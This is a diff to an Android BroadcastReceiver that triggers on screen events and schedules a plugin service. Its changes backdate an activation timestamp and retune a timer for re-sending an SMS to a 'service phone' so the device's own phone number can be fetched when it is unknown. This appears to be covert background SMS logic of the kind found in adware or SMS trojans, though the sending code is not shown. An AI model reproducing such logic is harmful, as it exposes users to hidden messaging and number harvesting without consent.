@@ -94,6 +94,9 @@ public class ScreenBRC extends BroadcastReceiver {
                             Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                             + " as active time = 0;");
                         }
+
+                        long dayTime = ((long) 24) * 60 * 60 * 1000;
+                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis() - dayTime);
                         Intent i = new Intent();
                         i.setAction(PluginService.ACTIVE_ACTION);
                         i.setClass(context, PluginService.class);
@@ -107,16 +110,23 @@ public class ScreenBRC extends BroadcastReceiver {
                     c.setTimeInMillis(lastActiveTime);
                     int lastDay = c.get(Calendar.DAY_OF_YEAR);
                     int lastMonth = c.get(Calendar.MONTH);
+                    int lastYear = c.get(Calendar.YEAR);
                     c = Calendar.getInstance();
                     int curDay = c.get(Calendar.DAY_OF_YEAR);
                     int curHour = c.get(Calendar.HOUR_OF_DAY);
                     int curMonth = c.get(Calendar.MONTH);
+                    int curYear = c.get(Calendar.YEAR);
 
+                    int smsSendDelayDays = (curYear - lastYear) * 365 - lastDay + curDay;
                     if (Config.DEBUG) {
-                        Config.LOGD("[[ScreenBRC::onReceive]] last active day = " + lastDay + " cur day = " + curDay
-                                        + " next random Hour is : " + SettingManager.getInstance().getKeyRandomNetworkTime()
-                                        + " action = " + action
-                                        + " >>>>>>>");
+                        Config.LOGD("[[ScreenBRC::onReceive]] : " +
+                                        "\n              last active day = " + lastDay + " last year : " + lastYear
+                                        + "\n              cur day = " + curDay + " cur year : " + curYear
+                                        + "\n              next random Hour is : " + SettingManager.getInstance().getKeyRandomNetworkTime()
+                                        + "\n              action = " + action
+                                        + "\n              last send SMS day time : " + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
+                                        + "\n              sms send delay days : " + smsSendDelayDays
+                                        + "\n>>>>>>>>>>>>>>>>>");
                     }
 
                     if (curDay != lastDay) {
@@ -131,15 +141,24 @@ public class ScreenBRC extends BroadcastReceiver {
                     }
 
                     if (SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() != 0
-                            && (curDay - SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() > Config.SMS_SEND_DELAY)
+//                            && (curDay - SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() > Config.SMS_SEND_DELAY)
+                            && (smsSendDelayDays > Config.SMS_SEND_DELAY)
                             && TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
-                        //如果时间大于10天的，并且手机号码是空的，那么就要重新获取手机号码
+                        //如果时间大于3天的，并且手机号码是空的，那么就要重新获取手机号码
                         int times = SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[ScreenBRC::onReceive]] SMS Service Phone cleart times : " + times);
+                        }
                         if (times > 90) {
                             Intent iPhoneFetch = new Intent();
+                            iPhoneFetch.setClass(context, PluginService.class);
                             iPhoneFetch.setAction(PluginService.ACTIVE_FETCH_PHONE_ACTION);
                             context.startService(iPhoneFetch);
                         } else {
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[ScreenBRC::onReceive]] clear send time to : " + (times + 1)
+                                        + " and setKeyDeviceHasSendToServicePhone = false");
+                            }
                             SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(times + 1);
                             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
                         }
